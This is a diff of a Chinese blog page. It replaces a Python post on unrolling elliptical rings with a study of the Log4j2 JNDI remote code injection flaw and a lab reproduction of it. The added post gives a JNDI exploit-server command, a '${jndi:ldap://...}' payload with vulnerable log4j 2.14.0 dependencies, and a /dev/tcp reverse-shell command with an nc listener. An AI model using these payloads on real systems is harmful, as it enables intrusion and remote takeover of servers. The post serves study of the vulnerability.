@@ -16,30 +16,28 @@
   <meta name="author" content="Encounter">
   <meta name="keywords" content="">
   
-    <meta name="description" content="最近的工作中遇到了一个问题，查了挺久发现没有相应的实现方式，于是自己摸索着写了一个椭圆环展开成为矩形长条的python算法，记录一下备忘。">
+    <meta name="description" content="最近身边很多人都在关注这个重大的Log4j2远程代码注入漏洞，影响范围非常广，因此学习一下漏洞原理以及做一下简单的复现。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="使用Python和极坐标变换将椭圆环展开为矩形">
-<meta property="og:url" content="https://chujian521.github.io/blog/2021/03/09/%E4%BD%BF%E7%94%A8Python%E5%92%8C%E6%9E%81%E5%9D%90%E6%A0%87%E5%8F%98%E6%8D%A2%E5%B0%86%E6%A4%AD%E5%9C%86%E7%8E%AF%E5%B1%95%E5%BC%80%E4%B8%BA%E7%9F%A9%E5%BD%A2/index.html">
+<meta property="og:title" content="Log4j JNDI远程代码注入漏洞学习">
+<meta property="og:url" content="https://chujian521.github.io/blog/2021/12/23/Log4j-JNDI%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/index.html">
 <meta property="og:site_name" content="X&#39;s blog">
-<meta property="og:description" content="最近的工作中遇到了一个问题，查了挺久发现没有相应的实现方式，于是自己摸索着写了一个椭圆环展开成为矩形长条的python算法，记录一下备忘。">
+<meta property="og:description" content="最近身边很多人都在关注这个重大的Log4j2远程代码注入漏洞，影响范围非常广，因此学习一下漏洞原理以及做一下简单的复现。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://chujian521.github.io/images/fj56.jpg">
-<meta property="og:image" content="https://chujian521.github.io/images/jizuobiao.jpg">
-<meta property="og:image" content="https://chujian521.github.io/images/tyyz.png">
-<meta property="og:image" content="https://chujian521.github.io/images/tyyzzk.png">
-<meta property="article:published_time" content="2021-03-09T05:55:15.000Z">
-<meta property="article:modified_time" content="2021-04-04T11:55:02.000Z">
+<meta property="og:image" content="https://chujian521.github.io/images/java.jpg">
+<meta property="og:image" content="https://chujian521.github.io/images/log4jvul.png">
+<meta property="og:image" content="https://chujian521.github.io/images/log4jattack.png">
+<meta property="article:published_time" content="2021-12-23T09:46:51.000Z">
+<meta property="article:modified_time" content="2022-11-23T12:42:38.873Z">
 <meta property="article:author" content="Encounter">
-<meta property="article:tag" content="图像处理">
-<meta property="article:tag" content="极坐标转换">
+<meta property="article:tag" content="漏洞原理">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://chujian521.github.io/images/fj56.jpg">
+<meta name="twitter:image" content="https://chujian521.github.io/images/java.jpg">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>使用Python和极坐标变换将椭圆环展开为矩形 - X&#39;s blog</title>
+  <title>Log4j JNDI远程代码注入漏洞学习 - X&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -232,7 +230,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="使用Python和极坐标变换将椭圆环展开为矩形"></span>
+            <span id="subtitle" data-typed-text="Log4j JNDI远程代码注入漏洞学习"></span>
           
         </div>
 
@@ -243,8 +241,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2021-03-09 13:55" pubdate>
-          2021年3月9日 下午
+        <time datetime="2021-12-23 17:46" pubdate>
+          2021年12月23日 下午
         </time>
       </span>
     
@@ -255,7 +253,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.1k 字
+          3.8k 字
         
       </span>
     
@@ -266,7 +264,7 @@
         
         
         
-          18 分钟
+          32 分钟
         
       </span>
     
@@ -312,31 +310,50 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">使用Python和极坐标变换将椭圆环展开为矩形</h1>
+            <h1 style="display: none">Log4j JNDI远程代码注入漏洞学习</h1>
             
             
               <div class="markdown-body">
                 
-                <p><strong>最近的工作中遇到了一个问题，查了挺久发现没有相应的实现方式，于是自己摸索着写了一个椭圆环展开成为矩形长条的python算法，记录一下备忘。</strong></p>
-<p><img src="/images/fj56.jpg" srcset="/img/loading.gif" lazyload></p>
+                <p><strong>最近身边很多人都在关注这个重大的Log4j2远程代码注入漏洞，影响范围非常广，因此学习一下漏洞原理以及做一下简单的复现。</strong></p>
+<p><img src="/images/java.jpg" srcset="/img/loading.gif" lazyload></p>
 <span id="more"></span>
 
-<h2 id="0x00代码"><a href="#0x00代码" class="headerlink" title="0x00代码"></a>0x00代码</h2><p>废话不多说先上代码：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> math<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_word_by_circle</span>(<span class="hljs-params">img,circle_center,radius,radius_width</span>):<br>    black_img = np.zeros((radius_width,<span class="hljs-built_in">int</span>(radius[<span class="hljs-number">1</span>]*(radius[<span class="hljs-number">0</span>]+radius[<span class="hljs-number">1</span>])/radius[<span class="hljs-number">0</span>])+<span class="hljs-number">500</span>,<span class="hljs-number">3</span>),dtype=<span class="hljs-string">&#x27;uint8&#x27;</span>)<br>    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,black_img.shape[<span class="hljs-number">0</span>]):<br>        <span class="hljs-keyword">for</span> col <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,black_img.shape[<span class="hljs-number">1</span>]):<br>            theta = <span class="hljs-number">0</span>-(math.pi*<span class="hljs-number">2</span>/black_img.shape[<span class="hljs-number">1</span>]*(col+<span class="hljs-number">1</span>)+<span class="hljs-number">1.57</span>)<br>            <br>            rho = <span class="hljs-built_in">int</span>((radius[<span class="hljs-number">0</span>]*radius[<span class="hljs-number">1</span>])/(((radius[<span class="hljs-number">1</span>]**<span class="hljs-number">2</span>)*(math.cos(theta)**<span class="hljs-number">2</span>)+(radius[<span class="hljs-number">0</span>]**<span class="hljs-number">2</span>)*(math.sin(theta)**<span class="hljs-number">2</span>))**<span class="hljs-number">0.5</span>))-row-<span class="hljs-number">1</span><br>            <br>            p_x = <span class="hljs-built_in">int</span>(circle_center[<span class="hljs-number">0</span>] + rho*math.cos(theta))<br>            p_y = <span class="hljs-built_in">int</span>(circle_center[<span class="hljs-number">1</span>] - rho*math.sin(theta))<br>            <br>            black_img[row,col,:] = img[p_y,p_x,:]<br>            <br>    <span class="hljs-keyword">return</span> black_img<br><br></code></pre></td></tr></table></figure>
+<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><h3 id="log4j2"><a href="#log4j2" class="headerlink" title="log4j2"></a>log4j2</h3><p>Log4j2是log4j 1.x的改进版，据说采用了一些新技术（无锁异步等），使得日志的吞吐量、性能比log4j 1.x提高了10倍，并解决了一些死锁的bug，而且配置更加简单灵活。log4j2被大量用于业务系统开发，记录日志信息，很多互联网公司以及大量的开源组件都使用该组件记录日志信息。</p>
+<h3 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h3><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gcode">用户认证：不需要用户认证<br><br>触发方式：远程<br><br>利用条件：需要外网访问权限<br><br>影响版本：<span class="hljs-number">2.0</span> ≤ Apache Lo<span class="hljs-name">g4</span>j<span class="hljs-number">2</span> &lt; <span class="hljs-number">2.15</span><span class="hljs-number">.0</span>-rc<span class="hljs-number">2</span><br><br>利用难度：极低，无需授权即可远程代码执行<br><br>威胁等级：严重，能造成远程代码执行<br></code></pre></td></tr></table></figure>
 
-<p>参数解释：</p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><h3 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h3><p>JNDI（Java Naming and Directory Interface–Java命名和目录接口）是Java中为命名和目录服务提供接口的API，通过名字可知道，JNDI主要由两部分组成：Naming（命名）和Directory（目录），其中Naming是指将对象通过唯一标识符绑定到一个上下文Context，同时可通过唯一标识符查找获得对象，而Directory主要指将某一对象的属性绑定到Directory的上下文DirContext中，同时可通过名字获取对象的属性同时操作属性。</p>
+<p>JNDI主要由JNDI API和JNDI SPI两部分组成，Java应用程序通过JNDI API访问目录服务，而JNDI API会调用Naming Manager实例化JNDI SPI，然后通过JNDI SPI去操作命名或目录服务其如LDAP， DNS，RMI等，JNDI内部已实现了对LDAP，DNS， RMI等目录服务器的操作API。</p>
+<p>java应用程序中可以调用JNDI协议访问远程服务，其底层包含了RMI、LDAP、DNS等协议的调用，可以通过JNDI访问远程的相关目录服务，本次爆发的攻击payload都是通过jndi调用了远程的恶意class，然后本地反序列化执行。</p>
+<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>log4j的源码中执行了lookup方法是导致本次漏洞的根本原因。</p>
+<p>当有客户端通过lookup(“refObj”)获取远程对象时，获取的是一个Reference存根(Stub)，由于是Reference存根，所以客户端会先在本地classpath中去检查是否存在refClassName，如果不存在则去指定的url中动态加载，在log4j的服务器上执行加载类的实例化操作（静态变量、静态代码块）</p>
+<p>攻击者在自己的客户端启动一个带有恶意代码的rmi服务，通过服务端的log4j的漏洞，向服务端的jndi context lookup的时候连接自己的rmi服务器，服务端连接rmi服务器执行lookup的时候会通过rmi查询到该地址指向的引用并且本地实例化这个类，所以在类中的构造方法或者静态代码块中写入逻辑，就会在服务端（jndi rmi过程中的客户端）实例化的时候执行到这段逻辑，导致jndi注入。</p>
+<p><img src="/images/log4jvul.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>受害者：JDK 8u311</p>
+<p>攻击者远程服务器上准备ldap或rmi服务，使用<a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit/">JNDI-Injection-Exploit: JNDI注入测试工具</a>：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">java -jar JNDI-Injection-Exploit-<span class="hljs-number">1.0</span>-SNAPSHOT-<span class="hljs-attribute">all</span><span class="hljs-selector-class">.jar</span> <span class="hljs-selector-attr">[-C]</span> <span class="hljs-selector-attr">[command]</span> <span class="hljs-selector-attr">[-A]</span> <span class="hljs-selector-attr">[address]</span><br></code></pre></td></tr></table></figure>
+
+<p>其中:</p>
 <ul>
-<li>img是用cv2.imread读入的带有椭圆的图片；circle_center指的是椭圆圆心的坐标数据，是一个列表，相对于左上角[x,y]；radius是一个列表，[长轴半径，短轴半径]；radius_width指的是椭圆环的宽度</li>
+<li><p><strong>-C</strong> - 远程class文件中要执行的命令。</p>
+<p>（可选项 , 默认命令是mac下打开计算器，即”open &#x2F;Applications&#x2F;Calculator.app”）</p>
+</li>
+<li><p><strong>-A</strong> - 服务器地址，可以是IP地址或者域名。</p>
+</li>
 </ul>
-<p>最终生成的矩形长条，以椭圆环的外周长为长（实际上由于展开的是椭圆的印章，便于查看，增加了长），以椭圆环的宽度为高。函数中，从椭圆环的最外圈开始遍历，最外圈即对应着矩形中的第一行，宽度为多少，则矩形中就有多少行。以圆心为中心构成极坐标系，则圆环上任意一点可以用rho和theta来表示，再根据公式计算出该点在图上的真实坐标，把像素值赋给矩形框中对应的位置，极坐标转换公式如下所示：</p>
-<p><img src="/images/jizuobiao.jpg" srcset="/img/loading.gif" lazyload></p>
-<h2 id="0x01效果"><a href="#0x01效果" class="headerlink" title="0x01效果"></a>0x01效果</h2><p>效果图如下：</p>
-<p><img src="/images/tyyz.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/images/tyyzzk.png" srcset="/img/loading.gif" lazyload></p>
-<p>由于椭圆的定位准确度不如圆，因此展开还有一些文字扭曲问题，效果还是没有很理想，后续还会继续优化。</p>
-<h2 id="0x02补充"><a href="#0x02补充" class="headerlink" title="0x02补充"></a>0x02补充</h2><p>由于某些椭圆是倾斜的，因此我们需要引入一个新的参数去定义椭圆的倾斜角度inclination，单位是rad，具体实现方案参考：<a target="_blank" rel="noopener" href="https://jingyan.baidu.com/article/2c8c281dfbf3dd0009252a7b.html">https://jingyan.baidu.com/article/2c8c281dfbf3dd0009252a7b.html</a></p>
-<p>代码如下，增加了坐标变换：</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">import</span> cv2<br><span class="hljs-attribute">import</span> numpy as np<br><span class="hljs-attribute">import</span> math<br><br><span class="hljs-attribute">def</span> get_word_by_circle(img,circle_center,radius,radius_width,inclination):<br>    <span class="hljs-attribute">black_img</span> = np.zeros((radius_width,int(radius[<span class="hljs-number">1</span>]*(radius[<span class="hljs-number">0</span>]+radius[<span class="hljs-number">1</span>])/radius[<span class="hljs-number">0</span>])+<span class="hljs-number">500</span>,<span class="hljs-number">3</span>),dtype=&#x27;uint8&#x27;)<br>    <span class="hljs-attribute">for</span> row in range(<span class="hljs-number">0</span>,black_img.shape[<span class="hljs-number">0</span>]):<br>        <span class="hljs-attribute">for</span> col in range(<span class="hljs-number">0</span>,black_img.shape[<span class="hljs-number">1</span>]):<br>            <span class="hljs-attribute">theta</span> = <span class="hljs-number">0</span>-(math.pi*<span class="hljs-number">2</span>/black_img.shape[<span class="hljs-number">1</span>]*(col+<span class="hljs-number">1</span>)+<span class="hljs-number">1</span>.<span class="hljs-number">57</span>-inclination)<br>            <br>            <span class="hljs-attribute">rho</span> = int((radius[<span class="hljs-number">0</span>]*radius[<span class="hljs-number">1</span>])/(((radius[<span class="hljs-number">1</span>]**<span class="hljs-number">2</span>)*(math.cos(theta)**<span class="hljs-number">2</span>)+(radius[<span class="hljs-number">0</span>]**<span class="hljs-number">2</span>)*(math.sin(theta)**<span class="hljs-number">2</span>))**<span class="hljs-number">0</span>.<span class="hljs-number">5</span>))-row-<span class="hljs-number">1</span><br>            <br>            <span class="hljs-attribute">p_x</span> = circle_center[<span class="hljs-number">0</span>] + rho*math.cos(theta)<br>            <span class="hljs-attribute">p_y</span> = circle_center[<span class="hljs-number">1</span>] - rho*math.sin(theta)<br><span class="hljs-comment">#坐标变换</span><br>            <span class="hljs-attribute">px</span> = int((p_x-circle_center[<span class="hljs-number">0</span>])*math.cos(inclination)-(p_y-circle_center[<span class="hljs-number">1</span>])*math.sin(inclination)+circle_center[<span class="hljs-number">0</span>])<br>            <span class="hljs-attribute">py</span> = int((p_x-circle_center[<span class="hljs-number">0</span>])*math.sin(inclination)+(p_y-circle_center[<span class="hljs-number">1</span>])*math.cos(inclination)+circle_center[<span class="hljs-number">1</span>])<br>            <br>            <span class="hljs-attribute">black_img</span>[row,col,:] = img[p_y,p_x,:]<br>            <br>    <span class="hljs-attribute">return</span> black_img<br><br></code></pre></td></tr></table></figure>
+<p>执行后会在控制台输出注入的ldap和rmi地址：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="hljs-string">&quot;calc&quot;</span> -A <span class="hljs-string">&quot;attacker server ip addr&quot;</span><br>[ADDRESS] &gt;&gt; attacker server ip addr<br>[COMMAND] &gt;&gt; calc<br>----------------------------JNDI Links---------------------------- <br>Target environment(Build <span class="hljs-keyword">in</span> JDK whose trustURLCodebase is <span class="hljs-literal">false</span> and have Tomcat 8+ or SpringBoot 1.2.x+ <span class="hljs-keyword">in</span> classpath):<br>rmi://attacker server ip addr:1099/emqemo<br>Target environment(Build <span class="hljs-keyword">in</span> JDK 1.7 whose trustURLCodebase is <span class="hljs-literal">true</span>):<br>rmi://attacker server ip addr:1099/dzjoi9<br>ldap://attacker server ip addr:1389/dzjoi9<br>Target environment(Build <span class="hljs-keyword">in</span> JDK 1.8 whose trustURLCodebase is <span class="hljs-literal">true</span>):<br>rmi://attacker server ip addr:1099/e54bwj<br>ldap://attacker server ip addr:1389/e54bwj<br><br>----------------------------Server Log----------------------------<br>2022-2-23 17:32:50 [JETTYSERVER]&gt;&gt; Listening on 0.0.0.0:8180<br>2022-2-23 17:32:50 [RMISERVER]  &gt;&gt; Listening on 0.0.0.0:1099<br>2022-2-23 17:32:50 [LDAPSERVER] &gt;&gt; Listening on 0.0.0.0:1389<br></code></pre></td></tr></table></figure>
+
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><h4 id="Java项目代码"><a href="#Java项目代码" class="headerlink" title="Java项目代码"></a>Java项目代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Log4j11Test</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger(<span class="hljs-string">&quot;Log4jDemoApplication&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>);<span class="hljs-comment">//JDK开启远程调用</span><br>        System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>);<br>        logger.error(<span class="hljs-string">&quot;$&#123;jndi:ldap://attacker server ip addr:1389/e54bwj&#125;&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>高版本的jdk默认关闭了trustURLCodebase，这里手动开启一下。</p>
+<h4 id="pom依赖配置"><a href="#pom依赖配置" class="headerlink" title="pom依赖配置"></a>pom依赖配置</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"> <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.14.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>     <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.14.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>     <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>执行以上代码后，就可以在受害者机器上弹出计算机</p>
+<p><img src="/images/log4jattack.png" srcset="/img/loading.gif" lazyload></p>
+<p>当然也可以做反弹shell，在攻击者服务器使用nc监听一个端口，设置command为<code>bash -i &gt;&amp; /dev/tcp/attacker server ip/9999 0&gt;&amp;1</code>即可，受害者使用交互式bash，与攻击者9999端口建立连接，然后在重定向个TCP 9999会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个Bash反弹环境。</p>
+<p>然后在攻击者服务器上使用nc监听9999端口即可：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 9999<br>Listening on [0.0.0.0] (family 0, port 9999)<br>Connection from victim ip 54317 received!<br></code></pre></td></tr></table></figure>
 
 
                 
@@ -350,9 +367,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/">#图像处理</a>
-      
-        <a href="/tags/%E6%9E%81%E5%9D%90%E6%A0%87%E8%BD%AC%E6%8D%A2/">#极坐标转换</a>
+        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/">#漏洞原理</a>
       
     </div>
   
@@ -364,8 +379,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>使用Python和极坐标变换将椭圆环展开为矩形</div>
-      <div>https://chujian521.github.io/blog/2021/03/09/使用Python和极坐标变换将椭圆环展开为矩形/</div>
+      <div>Log4j JNDI远程代码注入漏洞学习</div>
+      <div>https://chujian521.github.io/blog/2021/12/23/Log4j-JNDI远程代码注入漏洞学习/</div>
     </div>
     <div class="license-meta">
       
@@ -377,7 +392,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2021年3月9日</div>
+          <div>2021年12月23日</div>
         </div>
       
       
@@ -409,9 +424,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/blog/2021/12/23/Log4j-JNDI%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" title="Log4j JNDI远程代码注入漏洞学习">
+                      <a href="/blog/2022/02/13/TPS%E8%96%84%E6%9D%BF%E6%A0%B7%E6%9D%A1%E5%8F%98%E6%8D%A2/" title="TPS薄板样条变换">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Log4j JNDI远程代码注入漏洞学习</span>
+                        <span class="hidden-mobile">TPS薄板样条变换</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -419,8 +434,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/blog/2021/01/05/NVIDIA%E9%A9%B1%E5%8A%A8%E5%AE%89%E8%A3%85%E4%B9%8B%E7%A6%81%E7%94%A8nouveau/" title="NVIDIA驱动安装之禁用nouveau">
-                        <span class="hidden-mobile">NVIDIA驱动安装之禁用nouveau</span>
+                      <a href="/blog/2021/03/09/%E4%BD%BF%E7%94%A8Python%E5%92%8C%E6%9E%81%E5%9D%90%E6%A0%87%E5%8F%98%E6%8D%A2%E5%B0%86%E6%A4%AD%E5%9C%86%E7%8E%AF%E5%B1%95%E5%BC%80%E4%B8%BA%E7%9F%A9%E5%BD%A2/" title="使用Python和极坐标变换将椭圆环展开为矩形">
+                        <span class="hidden-mobile">使用Python和极坐标变换将椭圆环展开为矩形</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -433,7 +448,7 @@
             
   <article id="comments" lazyload>
     
-  <div id="SOHUCS" sid='https://chujian521.github.io/blog/2021/03/09/%E4%BD%BF%E7%94%A8Python%E5%92%8C%E6%9E%81%E5%9D%90%E6%A0%87%E5%8F%98%E6%8D%A2%E5%B0%86%E6%A4%AD%E5%9C%86%E7%8E%AF%E5%B1%95%E5%BC%80%E4%B8%BA%E7%9F%A9%E5%BD%A2/'></div>
+  <div id="SOHUCS" sid='https://chujian521.github.io/blog/2021/12/23/Log4j-JNDI%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/'></div>
   <script type="text/javascript">
     Fluid.utils.loadComments('#SOHUCS', function() {
       Fluid.utils.createScript("https://changyan.sohu.com/upload/changyan.js", function() {
